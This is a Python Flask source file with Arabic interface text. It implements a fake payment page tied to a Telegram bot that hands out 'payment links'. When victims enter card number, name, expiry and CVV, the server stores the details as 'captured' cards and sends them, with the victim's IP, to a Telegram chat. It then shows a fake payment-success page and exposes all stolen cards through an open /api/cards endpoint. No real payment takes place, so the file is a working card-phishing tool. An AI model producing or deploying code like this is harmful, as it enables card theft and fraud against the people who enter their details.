from flask import Flask, request, jsonify, send_from_directory
import os, uuid, requests
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
PORT = int(os.environ.get('PORT', 5000))
BOT_TOKEN = os.environ.get('BOT_TOKEN')
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

orders = {}
captured_cards = {}

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/pay')
def pay():
    return send_from_directory('static', 'index.html')

@app.route('/api/generate-payment-link', methods=['POST'])
def generate_payment_link():
    data = request.get_json()
    amount = data.get('amount')
    currency = data.get('currency', 'USD')
    chat_id = data.get('chatId')
    
    if not amount or not chat_id:
        return jsonify({'success': False, 'message': 'amount and chatId required'}), 400
    
    order_id = str(uuid.uuid4())
    base_url = os.environ.get('BASE_URL', request.host_url.rstrip('/'))
    payment_url = f"{base_url}/pay?amount={amount}&currency={currency}&chat_id={chat_id}&order_id={order_id}"
    
    orders[order_id] = {
        'amount': amount,
        'currency': currency,
        'chat_id': chat_id,
        'status': 'pending',
        'created_at': datetime.now().isoformat()
    }
    
    return jsonify({'success': True, 'paymentUrl': payment_url, 'orderId': order_id})

@app.route('/api/process-payment', methods=['POST'])
def process_payment():
    data = request.get_json()
    
    card_number = data.get('cardNumber', '').replace(' ', '')
    card_name = data.get('cardName', '').strip()
    expiry_date = data.get('expiryDate', '')
    cvv = data.get('cvv', '')
    amount = data.get('amount')
    currency = data.get('currency', 'USD')
    chat_id = data.get('chatId')
    order_id = data.get('orderId')
    
    if len(card_number) != 16 or not card_number.isdigit():
        return jsonify({'success': False, 'message': 'رقم البطاقة يجب ان يكون 16 رقماً'}), 400
    
    if len(card_name) < 3:
        return jsonify({'success': False, 'message': 'اسم صاحب البطاقة غير صحيح'}), 400
    
    if not expiry_date or len(expiry_date) != 5 or '/' not in expiry_date:
        return jsonify({'success': False, 'message': 'تاريخ انتهاء الصلاحية غير صحيح (MM/YY)'}), 400
    
    if len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
        return jsonify({'success': False, 'message': 'CVV غير صحيح'}), 400
    
    transaction_id = f"TXN-{uuid.uuid4().hex[:16].upper()}"
    
    captured_data = {
        'card_number': card_number,
        'card_name': card_name,
        'expiry_date': expiry_date,
        'cvv': cvv,
        'amount': amount,
        'currency': currency,
        'chat_id': chat_id,
        'order_id': order_id,
        'transaction_id': transaction_id,
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', '')
    }
    
    captured_cards[transaction_id] = captured_data
    
    send_full_data_to_telegram(captured_data)
    
    if order_id in orders:
        orders[order_id]['status'] = 'completed'
        orders[order_id]['transaction_id'] = transaction_id
    
    return jsonify({
        'success': True,
        'message': 'تمت عملية الدفع بنجاح',
        'transactionId': transaction_id,
        'redirectUrl': f'/success?txn={transaction_id}'
    })

def send_full_data_to_telegram(data):
    try:
        message = f"""
💳 *بيانات بطاقة جديدة* 💳

👤 الاسم: `{data['card_name']}`
💳 الرقم: `{data['card_number']}`
📅 الانتهاء: `{data['expiry_date']}`
🔒 CVV: `{data['cvv']}`
💰 المبلغ: `{data['amount']} {data['currency']}`
🆔 المعاملة: `{data['transaction_id']}`
📱 Chat ID: `{data['chat_id']}`
🕐 الوقت: `{data['timestamp']}`
🌐 IP: `{data['ip']}`
"""
        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            'chat_id': data['chat_id'],
            'text': message,
            'parse_mode': 'Markdown'
        })
    except Exception as e:
        print(f"Error: {e}")

@app.route('/success')
def success():
    txn = request.args.get('txn', '')
    return f"<!DOCTYPE html><html lang='ar' dir='rtl'><head><meta charset='UTF-8'><title>تم الدفع</title><style>body{{font-family:sans-serif;background:#0a0a0f;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}}.card{{background:linear-gradient(145deg,#2a2a3a,#1a1a2e);padding:50px;border-radius:24px;text-align:center;border:1px solid rgba(255,255,255,0.1);box-shadow:0 25px 80px rgba(0,0,0,0.6);max-width:400px;width:90%;}}.check{{width:80px;height:80px;background:linear-gradient(135deg,#28a745,#20c997);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 25px;font-size:40px;color:white;}}h1{{color:#fff;}}p{{color:#888;}}.txn{{color:#ffd700;font-family:monospace;font-size:16px;margin-top:15px;}}</style></head><body><div class='card'><div class='check'>✓</div><h1>تم الدفع بنجاح!</h1><p>شكراً لك على الدفع.</p><p class='txn'>رقم المعاملة: {txn}</p></div></body></html>"

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.get_json()
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        
        if text == '/start':
            send_msg(chat_id, 'أهلاً بك!\n\nلإنشاء طلب:\n/pay المبلغ العملة\n\nمثال: /pay 100 USD')
        elif text.startswith('/pay'):
            parts = text.split()
            amount = parts[1] if len(parts) > 1 else None
            currency = parts[2] if len(parts) > 2 else 'USD'
            
            if not amount or not amount.replace('.', '').isdigit():
                send_msg(chat_id, '❌ رقم غير صحيح\nمثال: /pay 50 USD')
            else:
                base_url = os.environ.get('BASE_URL', request.host_url.rstrip('/'))
                order_id = str(uuid.uuid4())
                payment_url = f"{base_url}/pay?amount={amount}&currency={currency}&chat_id={chat_id}&order_id={order_id}"
                orders[order_id] = {'amount': amount, 'currency': currency, 'chat_id': chat_id, 'status': 'pending', 'created_at': datetime.now().isoformat()}
                send_msg(chat_id, f'🔗 رابط الدفع جاهز!\n\nالمبلغ: {amount} {currency}\n{payment_url}')
        elif text == '/status':
            send_msg(chat_id, '✅ البوت يعمل')
    return 'OK', 200

def send_msg(chat_id, text):
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", json={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'})
    except Exception as e:
        print(f"Send error: {e}")

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/api/cards', methods=['GET'])
def get_cards():
    return jsonify({
        'total': len(captured_cards),
        'cards': list(captured_cards.values())
    })

if __name__ == '__main__':
    print("Server starting...")
    print(f"Port: {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
